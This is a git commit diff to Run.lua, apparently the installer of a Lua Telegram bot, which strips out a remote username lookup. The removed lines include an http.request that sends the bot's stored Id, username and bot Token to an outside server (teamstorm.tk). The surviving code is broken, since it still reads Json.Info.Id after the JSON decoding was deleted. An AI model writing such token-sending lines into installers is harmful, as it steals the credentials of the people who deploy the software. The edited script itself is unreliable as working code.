e33970cb3308e47d9d5f77f0eaca8e071008117f
Olifayy <59937868+Olifayy@users.noreply.github.com>
2020-03-06 22:52:49 +0300

    Add files via upload

--- Run.lua
+++ Run.lua
@@ -34,37 +34,20 @@ os.execute('lua Run.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------
-if not database:get(Server_Tshake.."UserName_Tshake") then
+if not database:get(Server_Tshake.."Id_Tshake") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
-local Get_Info = http.request("http://teamstorm.tk/GetUser/?id="..UserName)
-if Get_Info:match('Is_Spam') then
-io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
-return false
-end
-local Json = JSON:decode(Get_Info)
-if Json.Info == false then
-io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
-os.execute('lua Run.lua')
-else
-if Json.Info == 'Channel' then
-io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
-os.execute('lua Run.lua')
-else
 io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
-database:set(Server_Tshake.."UserName_Tshake",Json.Info.Username)
 database:set(Server_Tshake.."Id_Tshake",Json.Info.Id)
-end
-end
 else
 io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
+os.execute('lua Run.lua')
 end 
 os.execute('lua Run.lua')
 end
 local function Files_Tshake_Info()
 Create_Info(database:get(Server_Tshake.."Token_Tshake"),database:get(Server_Tshake.."Id_Tshake"),database:get(Server_Tshake.."UserName_Tshake"))   
-http.request("http://teamstorm.tk/insert/?id="..database:get(Server_Tshake.."Id_Tshake").."&user="..database:get(Server_Tshake.."UserName_Tshake").."&token="..database:get(Server_Tshake.."Token_Tshake"))
 local RunTshake = io.open("Olifay", 'w')
 RunTshake:write([[
 #!/usr/bin/env bash
